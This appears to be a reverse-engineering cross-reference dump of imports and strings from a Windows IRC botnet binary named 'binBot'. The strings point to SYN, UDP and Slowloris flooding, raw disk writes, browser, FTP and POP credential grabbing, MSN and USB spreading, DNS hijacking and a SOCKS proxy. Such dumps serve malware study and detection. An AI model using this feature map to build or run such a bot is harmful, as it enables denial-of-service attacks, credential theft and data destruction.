reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x17509564	0x17511174	import	0x17509430	KERNEL32.dll.GetTickCount
0x175095e0	0x17511174	import	0x17509580	KERNEL32.dll.GetTickCount
0x175095fc	0x17511120	import	0x17509580	KERNEL32.dll.lstrcpyA
0x17509602	0x175129e0	string	0x17509580	Mozilla/4.0
0x1750963c	0x175129d8	string	0x17509580	POST
0x1750964a	0x175129d8	string	0x17509580	POST
0x1750967f	0x17512968	string	0x17509580	%s / ?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nKeep-Alive: 300\r\nConnection: keep-alive\r\nContent-Length: 42\r\n
0x1750970b	0x17511180	import	0x175096b0	KERNEL32.dll.HeapFree
0x17509728	0x175110a0	import	0x175096b0	KERNEL32.dll.lstrcpynA
0x17509751	0x17511180	import	0x175096b0	KERNEL32.dll.HeapFree
0x17509770	0x17511174	import	0x175096b0	KERNEL32.dll.GetTickCount
0x175097ba	0x17515ee4	string	0x175096b0	[SYN]: Starting flood on "%s:%d" for %d second(s)
0x175097f0	0x17515f18	string	0x175096b0	[SYN]: Finished flood on "%s:%d"
0x1750981c	0x17511180	import	0x175096b0	KERNEL32.dll.HeapFree
0x1750988b	0x17511180	import	0x17509830	KERNEL32.dll.HeapFree
0x175098a8	0x175110a0	import	0x17509830	KERNEL32.dll.lstrcpynA
0x175098d1	0x17511180	import	0x17509830	KERNEL32.dll.HeapFree
0x175098f0	0x17511174	import	0x17509830	KERNEL32.dll.GetTickCount
0x1750993a	0x17515e8c	string	0x17509830	[UDP]: Starting flood on "%s:%d" for %d second(s)
0x17509970	0x17515ec0	string	0x17509830	[UDP]: Finished flood on "%s:%d"
0x1750999c	0x17511180	import	0x17509830	KERNEL32.dll.HeapFree
0x17509a2d	0x17511174	import	0x175099b0	KERNEL32.dll.GetTickCount
0x17509a60	0x17511174	import	0x175099b0	KERNEL32.dll.GetTickCount
0x17509abe	0x17511188	import	0x175099b0	KERNEL32.dll.Sleep
0x17509ae7	0x17511120	import	0x175099b0	KERNEL32.dll.lstrcpyA
0x17509af0	0x17512a08	string	0x175099b0	X-a: b\r\n
0x17509b00	0x175129f0	string	0x175099b0	Connection: Close\r\n\r\n
0x17509b0f	0x17511184	import	0x175099b0	KERNEL32.dll.lstrlenA
0x17509b51	0x17511188	import	0x175099b0	KERNEL32.dll.Sleep
0x17509b5e	0x17511184	import	0x175099b0	KERNEL32.dll.lstrlenA
0x17509b66	0x17511174	import	0x175099b0	KERNEL32.dll.GetTickCount
0x17509b7f	0x17511188	import	0x175099b0	KERNEL32.dll.Sleep
0x17509bd2	0x17511174	import	0x175099b0	KERNEL32.dll.GetTickCount
0x17509be4	0x17511184	import	0x175099b0	KERNEL32.dll.lstrlenA
0x17509c43	0x17511174	import	0x175099b0	KERNEL32.dll.GetTickCount
0x17509c9a	0x17511180	import	0x17509c60	KERNEL32.dll.HeapFree
0x17509cb3	0x17511120	import	0x17509c60	KERNEL32.dll.lstrcpyA
0x17509cc4	0x175110a0	import	0x17509c60	KERNEL32.dll.lstrcpynA
0x17509cf9	0x17515e30	string	0x17509c60	[Slowloris]: Starting flood on "%s" for %d minute(s)
0x17509d45	0x17515e68	string	0x17509c60	[Slowloris]: Finished flood on "%s"
0x17509d73	0x17511180	import	0x17509c60	KERNEL32.dll.HeapFree
0x17509da7	0x17511094	import	0x17509d90	KERNEL32.dll.VirtualAlloc
0x17509dd0	0x17512a14	string	0x17509d90	\\.\PHYSICALDRIVE0
0x17509dd5	0x17511110	import	0x17509d90	KERNEL32.dll.CreateFileA
0x17509e02	0x17511098	import	0x17509d90	KERNEL32.dll.DeviceIoControl
0x17509e21	0x1751109c	import	0x17509d90	KERNEL32.dll.SetFilePointer
0x17509e2a	0x17511164	import	0x17509d90	KERNEL32.dll.WriteFile
0x17509e56	0x1751109c	import	0x17509d90	KERNEL32.dll.SetFilePointer
0x17509ea2	0x17511098	import	0x17509d90	KERNEL32.dll.DeviceIoControl
0x17509eec	0x17512a28	string	0x17509ec0	00100
0x17509f09	0x17512a14	string	0x17509ec0	\\.\PHYSICALDRIVE0
0x17509f16	0x17511110	import	0x17509ec0	KERNEL32.dll.CreateFileA
0x17509f2b	0x17511098	import	0x17509ec0	KERNEL32.dll.DeviceIoControl
0x17509f5a	0x17511164	import	0x17509ec0	KERNEL32.dll.WriteFile
0x17509f77	0x17511150	import	0x17509ec0	KERNEL32.dll.CloseHandle
0x1750a0a2	0x17511158	import	0x1750a080	KERNEL32.dll.CreateFileW
0x1750a0c0	0x17511164	import	0x1750a080	KERNEL32.dll.WriteFile
0x1750a0cb	0x17511150	import	0x1750a080	KERNEL32.dll.CloseHandle
0x1750a0d8	0x17511150	import	0x1750a080	KERNEL32.dll.CloseHandle
0x1750a184	0x175110c8	import	0x1750a150	KERNEL32.dll.GetWindowsDirectoryW
0x1750a2ab	0x17511090	import	0x1750a260	KERNEL32.dll.CreateProcessW
0x1750a2c5	0x17511174	import	0x1750a2c0	KERNEL32.dll.GetTickCount
0x1750a39f	0x17511184	import	0x1750a310	KERNEL32.dll.lstrlenA
0x1750a3a8	0x175157a0	string	0x1750a310	30e4*ga1
0x1750a3b0	0x175157a0	string	0x1750a310	30e4*ga1
0x1750a3bb	0x17516904	string	0x1750a310	\\.\pipe\%08x_ipc
0x1750a3fd	0x175157a0	string	0x1750a310	30e4*ga1
0x1750a40e	0x175157a0	string	0x1750a310	30e4*ga1
0x1750a436	0x1751119c	import	0x1750a310	KERNEL32.dll.EnterCriticalSection
0x1750a452	0x17511110	import	0x1750a310	KERNEL32.dll.CreateFileA
0x1750a464	0x17511198	import	0x1750a310	KERNEL32.dll.LeaveCriticalSection
0x1750a484	0x17511164	import	0x1750a310	KERNEL32.dll.WriteFile
0x1750a48b	0x17511150	import	0x1750a310	KERNEL32.dll.CloseHandle
0x1750a496	0x17511188	import	0x1750a310	KERNEL32.dll.Sleep
0x1750a4a1	0x17511198	import	0x1750a310	KERNEL32.dll.LeaveCriticalSection
0x1750a557	0x17512a48	string	0x1750a550	NtShutdownSystem
0x1750a55c	0x175116e8	string	0x1750a550	ntdll.dll
0x1750a57a	0x17511024	import	0x1750a550	ADVAPI32.dll.OpenProcessToken
0x1750a588	0x17512a34	string	0x1750a550	SeShutdownPrivilege
0x1750a58f	0x17511028	import	0x1750a550	ADVAPI32.dll.LookupPrivilegeValueA
0x1750a5b3	0x1751102c	import	0x1750a550	ADVAPI32.dll.AdjustTokenPrivileges
0x1750a5b9	0x1751116c	import	0x1750a550	KERNEL32.dll.GetLastError
0x1750a659	0x175110cc	import	0x1750a5d0	KERNEL32.dll.CreateThread
0x1750a661	0x17512ad4	string	0x1750a5d0	binBot Error
0x1750a666	0x17512a60	string	0x1750a5d0	This binary is invalid.\r\n\r\nMain reasons:\r\n- you stupid cracker\r\n- you stupid cracker...\r\n- you stupid cracker?!\r\n
0x1750a66f	0x175112a4	import	0x1750a5d0	USER32.dll.MessageBoxA
0x1750a678	0x175110f8	import	0x1750a5d0	KERNEL32.dll.WaitForSingleObject
0x1750a680	0x1751108c	import	0x1750a5d0	KERNEL32.dll.ExitProcess
0x1750a6df	0x17511238	import	0x1750a690	SHELL32.dll.SHGetSpecialFolderPathW
0x1750a6f9	0x17511240	import	0x1750a690	SHLWAPI.dll.PathAppendW
0x1750a70a	0x17512af0	string	0x1750a690	"%s" %S
0x1750a77f	0x17511090	import	0x1750a690	KERNEL32.dll.CreateProcessW
0x1750a7aa	0x17511174	import	0x1750a790	KERNEL32.dll.GetTickCount
0x1750a7dc	0x17511188	import	0x1750a790	KERNEL32.dll.Sleep
0x1750a819	0x17511174	import	0x1750a800	KERNEL32.dll.GetTickCount
0x1750a859	0x17511188	import	0x1750a800	KERNEL32.dll.Sleep
0x1750a8b1	0x17511534	string	0x1750a880	msnu
0x1750a8bd	0x17511330	string	0x1750a880	pdef
0x1750a8c9	0x17511b04	string	0x1750a880	ffgrab
0x1750a8d5	0x17511b0c	string	0x1750a880	iegrab
0x1750a8e1	0x17511a9c	string	0x1750a880	ftpgrab
0x1750a8ed	0x17511a68	string	0x1750a880	popgrab
0x1750a8fc	0x175113e4	string	0x1750a880	bdns
0x1750a908	0x17512b1c	string	0x1750a880	usbi
0x1750a914	0x17512b14	string	0x1750a880	httpi
0x1750a946	0x17512b04	string	0x1750a880	http
0x1750a956	0x17512b04	string	0x1750a880	http
0x1750a970	0x17512b30	string	0x1750a970	DnsFlushResolverCache
0x1750a975	0x17512b24	string	0x1750a970	dnsapi.dll
0x1750a9ed	0x17511090	import	0x1750a990	KERNEL32.dll.CreateProcessW
0x1750aa39	0x175129e0	string	0x1750aa10	Mozilla/4.0
0x1750aa45	0x17511120	import	0x1750aa10	KERNEL32.dll.lstrcpyA
0x1750aa60	0x175112b8	import	0x1750aa10	WININET.dll.InternetOpenA
0x1750aa78	0x17511184	import	0x1750aa10	KERNEL32.dll.lstrlenA
0x1750aa8c	0x175112b4	import	0x1750aa10	WININET.dll.InternetOpenUrlA
0x1750aac0	0x175112b0	import	0x1750aa10	WININET.dll.HttpQueryInfoA
0x1750aae2	0x175112ac	import	0x1750aa10	WININET.dll.InternetQueryDataAvailable
0x1750ab00	0x175112c8	import	0x1750aa10	WININET.dll.InternetReadFile
0x1750abe7	0x175112c4	import	0x1750aa10	WININET.dll.InternetCloseHandle
0x1750ac1a	0x17511178	import	0x1750ac00	KERNEL32.dll.HeapAlloc
0x1750ac29	0x175112bc	import	0x1750ac00	WININET.dll.HttpQueryInfoW
0x1750ac44	0x1751116c	import	0x1750ac00	KERNEL32.dll.GetLastError
0x1750ac5e	0x175111a0	import	0x1750ac00	KERNEL32.dll.HeapReAlloc
0x1750ac80	0x17512b48	string	0x1750ac00	POST
0x1750ac85	0x17511134	import	0x1750ac00	KERNEL32.dll.lstrcmpW
0x1750ac99	0x17511180	import	0x1750ac00	KERNEL32.dll.HeapFree
0x1750acb2	0x17511180	import	0x1750ac00	KERNEL32.dll.HeapFree
0x1750ad0a	0x17511178	import	0x1750acd0	KERNEL32.dll.HeapAlloc
0x1750ad1a	0x175112c0	import	0x1750acd0	WININET.dll.InternetQueryOptionW
0x1750ad31	0x1751116c	import	0x1750acd0	KERNEL32.dll.GetLastError
0x1750ad4f	0x175111a0	import	0x1750acd0	KERNEL32.dll.HeapReAlloc
0x1750ad80	0x1751112c	import	0x1750acd0	KERNEL32.dll.WideCharToMultiByte
0x1750adb3	0x17511120	import	0x1750acd0	KERNEL32.dll.lstrcpyA
0x1750ade6	0x17511180	import	0x1750acd0	KERNEL32.dll.HeapFree
0x1750ae05	0x17511184	import	0x1750ae00	KERNEL32.dll.lstrlenA
0x1750ae13	0x17511178	import	0x1750ae00	KERNEL32.dll.HeapAlloc
0x1750ae69	0x17511120	import	0x1750ae00	KERNEL32.dll.lstrcpyA
0x1750ae7f	0x17511088	import	0x1750ae00	KERNEL32.dll.lstrcatA
0x1750aeb0	0x1750af0a	string	0x1750ae00	hT+Q
0x1750aed5	0x17511180	import	0x1750ae00	KERNEL32.dll.HeapFree
0x1750aeeb	0x17511180	import	0x1750ae00	KERNEL32.dll.HeapFree
0x1750af58	0x17511120	import	0x1750ae00	KERNEL32.dll.lstrcpyA
0x1750af70	0x17511180	import	0x1750ae00	KERNEL32.dll.HeapFree
0x1750afaf	0x17511184	import	0x1750afa0	KERNEL32.dll.lstrlenA
0x1750afcb	0x17511178	import	0x1750afa0	KERNEL32.dll.HeapAlloc
0x1750b024	0x17512b88	string	0x1750afa0	POST /%1023s
0x1750b055	0x17512b7c	string	0x1750afa0	Host:
0x1750b08e	0x175110a0	import	0x1750afa0	KERNEL32.dll.lstrcpynA
0x1750b0d5	0x17511178	import	0x1750afa0	KERNEL32.dll.HeapAlloc
0x1750b0e3	0x17512b74	string	0x1750afa0	HTTP
0x1750b0ff	0x17512b68	string	0x1750afa0	http://%s/
0x1750b11e	0x17512b58	string	0x1750afa0	http://%s/%s
0x1750b13c	0x17511180	import	0x1750afa0	KERNEL32.dll.HeapFree
0x1750b16a	0x17511184	import	0x1750b160	KERNEL32.dll.lstrlenA
0x1750b186	0x17511178	import	0x1750b160	KERNEL32.dll.HeapAlloc
0x1750b199	0x17512b98	string	0x1750b160	\r\n\r\n
0x1750b1d2	0x17511178	import	0x1750b160	KERNEL32.dll.HeapAlloc
0x1750b1e5	0x175110a0	import	0x1750b160	KERNEL32.dll.lstrcpynA
0x1750b1f8	0x17511180	import	0x1750b160	KERNEL32.dll.HeapFree
0x1750b2ee	0x1750b2b0	string	0x1750b290	<%u2
0x1750b312	0x1751117c	import	0x1750b300	KERNEL32.dll.GetProcessHeap
0x1750b319	0x17511178	import	0x1750b300	KERNEL32.dll.HeapAlloc
0x1750b366	0x17512bb4	string	0x1750b300	lol.exe
0x1750b387	0x175110c8	import	0x1750b300	KERNEL32.dll.GetWindowsDirectoryW
0x1750b3a1	0x175110b8	import	0x1750b300	KERNEL32.dll.lstrcpynW
0x1750b3bb	0x17511084	import	0x1750b300	KERNEL32.dll.GetVolumeInformationW
0x1750b3cd	0x17511184	import	0x1750b300	KERNEL32.dll.lstrlenA
0x1750b3d3	0x175157a0	string	0x1750b300	30e4*ga1
0x1750b3ea	0x175157a0	string	0x1750b300	30e4*ga1
0x1750b45b	0x17512ba0	string	0x1750b300	.exe
0x1750b461	0x175110bc	import	0x1750b300	KERNEL32.dll.lstrcatW
0x1750b4a9	0x17512c18	string	0x1750b480	isadmin
0x1750b4ae	0x17512c10	string	0x1750b480	admin
0x1750b4fe	0x17511120	import	0x1750b480	KERNEL32.dll.lstrcpyA
0x1750b536	0x17511178	import	0x1750b480	KERNEL32.dll.HeapAlloc
0x1750b550	0x175110d8	import	0x1750b480	KERNEL32.dll.GetVersionExA
0x1750b60d	0x17511178	import	0x1750b480	KERNEL32.dll.HeapAlloc
0x1750b620	0x175168e8	string	0x1750b480	http://api.wipmania.com/
0x1750b63b	0x17512be8	string	0x1750b480	<br>
0x1750b650	0x17511184	import	0x1750b480	KERNEL32.dll.lstrlenA
0x1750b65f	0x17511184	import	0x1750b480	KERNEL32.dll.lstrlenA
0x1750b67d	0x17511080	import	0x1750b480	KERNEL32.dll.GetLocaleInfoA
0x1750b6a8	0x17511128	import	0x1750b480	KERNEL32.dll.lstrcmpA
0x1750b6c5	0x17511080	import	0x1750b480	KERNEL32.dll.GetLocaleInfoA
0x1750b6f9	0x17511080	import	0x1750b480	KERNEL32.dll.GetLocaleInfoA
0x1750b741	0x17511178	import	0x1750b480	KERNEL32.dll.HeapAlloc
0x1750b7f1	0x17512bd0	string	0x1750b480	n%s_%s-%s%s-%s
0x1750b80b	0x17512bc4	string	0x1750b480	_%s-%s%s-%s
0x1750b8be	0x17512bd0	string	0x1750b480	n%s_%s-%s%s-%s
0x1750b8d5	0x17512bc4	string	0x1750b480	_%s-%s%s-%s
0x1750b94b	0x17512c20	string	0x1750b900	127.0.0.1
0x1750b975	0x17511188	import	0x1750b900	KERNEL32.dll.Sleep
0x1750b9bc	0x1751119c	import	0x1750b990	KERNEL32.dll.EnterCriticalSection
0x1750b9d1	0x175112a0	import	0x1750b990	USER32.dll.wvsprintfA
0x1750b9f2	0x17511198	import	0x1750b990	KERNEL32.dll.LeaveCriticalSection
0x1750ba42	0x175112a0	import	0x1750ba00	USER32.dll.wvsprintfA
0x1750ba56	0x17515d4c	string	0x1750ba00	PPPPMSG %s :%s\r\n
0x1750ba7f	0x17515c54	string	0x1750ba70	PASS %s\r\n
0x1750ba9c	0x17515d24	string	0x1750ba70	KCIK %s\r\n
0x1750bab4	0x17515d10	string	0x1750ba70	SDRR %s 0 0 :%s\r\n
0x1750bb52	0x17511184	import	0x1750bb30	KERNEL32.dll.lstrlenA
0x1750bba0	0x17511128	import	0x1750bb80	KERNEL32.dll.lstrcmpA
0x1750bbff	0x17511128	import	0x1750bbb0	KERNEL32.dll.lstrcmpA
0x1750bc2c	0x175157a0	string	0x1750bbb0	30e4*ga1
0x1750bc36	0x17515d88	string	0x1750bbb0	[v="%s" c="%s" h="%s" p="%S"]
0x1750bc89	0x17512cf4	string	0x1750bbb0	reconnecting
0x1750bc8e	0x17515d60	string	0x1750bbb0	QUIT :%s\r\n
0x1750bcc3	0x17511184	import	0x1750bbb0	KERNEL32.dll.lstrlenA
0x1750bce1	0x17511180	import	0x1750bbb0	KERNEL32.dll.HeapFree
0x1750bcec	0x17512cf4	string	0x1750bbb0	reconnecting
0x1750bcf1	0x17515d60	string	0x1750bbb0	QUIT :%s\r\n
0x1750bd28	0x17512ce8	string	0x1750bbb0	exiting
0x1750bd2d	0x17515d60	string	0x1750bbb0	QUIT :%s\r\n
0x1750bd5a	0x17512cdc	string	0x1750bbb0	removing
0x1750bd5f	0x17515d60	string	0x1750bbb0	QUIT :%s\r\n
0x1750bdb2	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750bdc6	0x17511088	import	0x1750bbb0	KERNEL32.dll.lstrcatA
0x1750bdd5	0x17515d30	string	0x1750bbb0	SEND %s %s\r\n
0x1750be0c	0x17512ccc	string	0x1750bbb0	#new
0x1750be18	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750be2a	0x17515d30	string	0x1750bbb0	SEND %s %s\r\n
0x1750be72	0x17512cbc	string	0x1750bbb0	#admin
0x1750be79	0x17512cb4	string	0x1750bbb0	#user
0x1750be7f	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750be91	0x17515d30	string	0x1750bbb0	SEND %s %s\r\n
0x1750becb	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750bee7	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750befa	0x17511088	import	0x1750bbb0	KERNEL32.dll.lstrcatA
0x1750bf0c	0x17515d30	string	0x1750bbb0	SEND %s %s\r\n
0x1750bf5f	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750bf73	0x17511088	import	0x1750bbb0	KERNEL32.dll.lstrcatA
0x1750bf82	0x17515d40	string	0x1750bbb0	PART %s\r\n
0x1750bfa6	0x17512ccc	string	0x1750bbb0	#new
0x1750bfb2	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750bfc4	0x17515d40	string	0x1750bbb0	PART %s\r\n
0x1750c00c	0x17512cbc	string	0x1750bbb0	#admin
0x1750c013	0x17512cb4	string	0x1750bbb0	#user
0x1750c019	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750c02b	0x17515d40	string	0x1750bbb0	PART %s\r\n
0x1750c065	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750c081	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750c094	0x17511088	import	0x1750bbb0	KERNEL32.dll.lstrcatA
0x1750c0a6	0x17515d40	string	0x1750bbb0	PART %s\r\n
0x1750c0c3	0x17515874	string	0x1750bbb0	stop
0x1750c0e3	0x17515840	string	0x1750bbb0	stats
0x1750c124	0x17516054	string	0x1750bbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0x1750c156	0x17516080	string	0x1750bbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0x1750c192	0x17516054	string	0x1750bbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0x1750c1b9	0x17516080	string	0x1750bbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0x1750c1d2	0x17515850	string	0x1750bbb0	logins
0x1750c225	0x17511180	import	0x1750bbb0	KERNEL32.dll.HeapFree
0x1750c25e	0x17512c88	string	0x1750bbb0	[Logins]: Cleared %d logins
0x1750c283	0x17512c80	string	0x1750bbb0	%s|%s
0x1750c2c2	0x17511184	import	0x1750bbb0	KERNEL32.dll.lstrlenA
0x1750c2d2	0x17511178	import	0x1750bbb0	KERNEL32.dll.HeapAlloc
0x1750c2ea	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750c321	0x175160d0	string	0x1750bbb0	[RSOCK4]: Stopped rsock4
0x1750c33f	0x17515848	string	0x1750bbb0	speed
0x1750c354	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750c3fd	0x175157f0	string	0x1750bbb0	jps獵 blocks=Basic Latin,CJK Unified Ideographs
0x1750c449	0x17515d30	string	0x1750bbb0	SEND %s %s\r\n
0x1750c4bf	0x17515d30	string	0x1750bbb0	SEND %s %s\r\n
0x1750c550	0x17515d40	string	0x1750bbb0	PART %s\r\n
0x1750c572	0x17515d40	string	0x1750bbb0	PART %s\r\n
0x1750c5d0	0x17511330	string	0x1750bbb0	pdef
0x1750c5e2	0x17511184	import	0x1750bbb0	KERNEL32.dll.lstrlenA
0x1750c5f7	0x17511178	import	0x1750bbb0	KERNEL32.dll.HeapAlloc
0x1750c60e	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750c61f	0x17511184	import	0x1750bbb0	KERNEL32.dll.lstrlenA
0x1750c633	0x17511088	import	0x1750bbb0	KERNEL32.dll.lstrcatA
0x1750c642	0x17511088	import	0x1750bbb0	KERNEL32.dll.lstrcatA
0x1750c679	0x17511330	string	0x1750bbb0	pdef
0x1750c68f	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750c6d0	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750c6e0	0x17511184	import	0x1750bbb0	KERNEL32.dll.lstrlenA
0x1750c706	0x17511088	import	0x1750bbb0	KERNEL32.dll.lstrcatA
0x1750c73d	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750c743	0x17511184	import	0x1750bbb0	KERNEL32.dll.lstrlenA
0x1750c77e	0x175114f8	string	0x1750bbb0	msnmsg
0x1750c7ce	0x17515f50	string	0x1750bbb0	[MSN]: Updated MSN spread message to "%s"
0x1750c7e7	0x17515808	string	0x1750bbb0	msn.int
0x1750c826	0x17511500	string	0x1750bbb0	msnint
0x1750c859	0x17511184	import	0x1750bbb0	KERNEL32.dll.lstrlenA
0x1750c876	0x17515f7c	string	0x1750bbb0	[MSN]: Updated MSN spread interval to "%s"
0x1750c88f	0x17515810	string	0x1750bbb0	http.set
0x1750c8b5	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750c8d0	0x17511184	import	0x1750bbb0	KERNEL32.dll.lstrlenA
0x1750c8f5	0x17511088	import	0x1750bbb0	KERNEL32.dll.lstrcatA
0x1750c92c	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750c955	0x17512b04	string	0x1750bbb0	http
0x1750c972	0x17515fa8	string	0x1750bbb0	[HTTP]: Updated HTTP spread message to "%s"
0x1750c97f	0x1751581c	string	0x1750bbb0	http.int
0x1750c9c0	0x17512b04	string	0x1750bbb0	http
0x1750c9df	0x17515ff8	string	0x1750bbb0	[HTTP]: Updated HTTP spread interval to "%s"
0x1750c9f8	0x17515828	string	0x1750bbb0	http.inj
0x1750ca16	0x17512b14	string	0x1750bbb0	httpi
0x1750ca26	0x17512c70	string	0x1750bbb0	enabled
0x1750ca2b	0x17515fd4	string	0x1750bbb0	[HTTP]: Injected value is now %s.
0x1750ca43	0x17512b14	string	0x1750bbb0	httpi
0x1750ca53	0x17512c64	string	0x1750bbb0	disabled
0x1750ca58	0x17515fd4	string	0x1750bbb0	[HTTP]: Injected value is now %s.
0x1750ca71	0x17515838	string	0x1750bbb0	mdns
0x1750ca9f	0x17511184	import	0x1750bbb0	KERNEL32.dll.lstrlenA
0x1750cadd	0x17511178	import	0x1750bbb0	KERNEL32.dll.HeapAlloc
0x1750caf3	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750cb36	0x175113e4	string	0x1750bbb0	bdns
0x1750cb41	0x1750a970	string	0x1750bbb0	h0+Q
0x1750cb56	0x17512c44	string	0x1750bbb0	[DNS]: Redirecting "%s" to "%s"
0x1750cb76	0x175113e4	string	0x1750bbb0	bdns
0x1750cb7b	0x175113dc	string	0x1750bbb0	block
0x1750cb85	0x1750a970	string	0x1750bbb0	h0+Q
0x1750cb95	0x17516040	string	0x1750bbb0	[DNS]: Blocked "%s"
0x1750cbf2	0x1750cc0a	string	0x1750bbb0	h|bQ
0x1750cbf4	0x17516028	string	0x1750bbb0	[Visit]: Visited "%s"
0x1750cc0a	0x1751627c	string	0x1750bbb0	[Visit]: Error visitng "%s"
0x1750cc3a	0x17511184	import	0x1750bbb0	KERNEL32.dll.lstrlenA
0x1750cc8b	0x17512c34	string	0x1750bbb0	%s-%s-%s
0x1750cca8	0x17512c80	string	0x1750bbb0	%s|%s
0x1750ccd4	0x17511178	import	0x1750bbb0	KERNEL32.dll.HeapAlloc
0x1750cce4	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750cd11	0x17515860	string	0x1750bbb0	slow
0x1750cd27	0x17512c80	string	0x1750bbb0	%s|%s
0x1750cd47	0x17511184	import	0x1750bbb0	KERNEL32.dll.lstrlenA
0x1750cd58	0x17511178	import	0x1750bbb0	KERNEL32.dll.HeapAlloc
0x1750cd70	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750cdfc	0x17511534	string	0x1750bbb0	msnu
0x1750ce55	0x17511330	string	0x1750bbb0	pdef
0x1750ce66	0x17511b04	string	0x1750bbb0	ffgrab
0x1750ce7b	0x17511b0c	string	0x1750bbb0	iegrab
0x1750ce8c	0x17511a9c	string	0x1750bbb0	ftpgrab
0x1750ce9d	0x17511a68	string	0x1750bbb0	popgrab
0x1750ceb2	0x175113e4	string	0x1750bbb0	bdns
0x1750cec7	0x17512b1c	string	0x1750bbb0	usbi
0x1750cf67	0x175160ac	string	0x1750bbb0	[RSOCK4]: Started rsock4 on "%s:%d"
0x1750cfe3	0x17512c34	string	0x1750bbb0	%s-%s-%s
0x1750d003	0x17511184	import	0x1750bbb0	KERNEL32.dll.lstrlenA
0x1750d013	0x17511178	import	0x1750bbb0	KERNEL32.dll.HeapAlloc
0x1750d02b	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750d043	0x17515868	string	0x1750bbb0	ssyn
0x1750d097	0x17512c34	string	0x1750bbb0	%s-%s-%s
0x1750d0b7	0x17511184	import	0x1750bbb0	KERNEL32.dll.lstrlenA
0x1750d0c8	0x17511178	import	0x1750bbb0	KERNEL32.dll.HeapAlloc
0x1750d0dc	0x17511120	import	0x1750bbb0	KERNEL32.dll.lstrcpyA
0x1750d0f0	0x175110cc	import	0x1750bbb0	KERNEL32.dll.CreateThread
0x1750d0f7	0x17511150	import	0x1750bbb0	KERNEL32.dll.CloseHandle
0x1750d145	0x17511128	import	0x1750d110	KERNEL32.dll.lstrcmpA
0x1750d18c	0x175110a0	import	0x1750d110	KERNEL32.dll.lstrcpynA
0x1750d198	0x17511184	import	0x1750d110	KERNEL32.dll.lstrlenA
0x1750d231	0x17511184	import	0x1750d220	KERNEL32.dll.lstrlenA
0x1750d243	0x17512d18	string	0x1750d220	MOTD
0x1750d2b5	0x17511128	import	0x1750d220	KERNEL32.dll.lstrcmpA
0x1750d2bb	0x17515d78	string	0x1750d220	PING
0x1750d2d1	0x17515d6c	string	0x1750d220	PPNG %s\r\n
0x1750d2f6	0x1750d31d	string	0x1750d220	h\f-Q
0x1750d308	0x17515d30	string	0x1750d220	SEND %s %s\r\n
0x1750d33c	0x17515d24	string	0x1750d220	KCIK %s\r\n
0x1750d351	0x175118c4	string	0x1750d220	JOIN
0x1750d37f	0x17515d80	string	0x1750d220	PPPPMSG
0x1750d43c	0x17515d30	string	0x1750d220	SEND %s %s\r\n
0x1750d5cd	0x175118d0	string	0x1750d530	%s:%d
